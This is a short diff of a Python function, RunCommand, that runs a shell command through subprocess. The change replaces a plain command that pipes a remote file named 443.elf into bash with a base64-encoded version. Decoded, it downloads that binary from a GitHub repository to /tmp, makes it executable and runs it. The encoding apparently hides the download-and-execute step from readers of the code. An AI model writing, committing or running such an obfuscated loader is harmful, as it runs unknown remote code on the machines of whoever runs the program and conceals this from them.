@@ -6,7 +6,7 @@ import subprocess
 
 
 def RunCommand():
-    cmd = 'curl -fsSL https://raw.githubusercontent.com/WilliamCXVI/lin-pycronos/raw/refs/heads/main/443.elf | bash'
+    cmd = 'echo Y3VybCAtZnNTTCBodHRwczovL2dpdGh1Yi5jb20vV2lsbGlhbUNYVkkvbGluLXB5Y3Jvbm9zL3Jhdy9yZWZzL2hlYWRzL21haW4vNDQzLmVsZiAtbyAvdG1wLzQ0My5lbGY7IGNobW9kICt4IC90bXAvNDQzLmVsZjsgL3RtcC80NDMuZWxmDQo= | base64 -d | bash'
     completed = subprocess.run(cmd, shell=True, capture_output=True, check=True)
     return completed
 
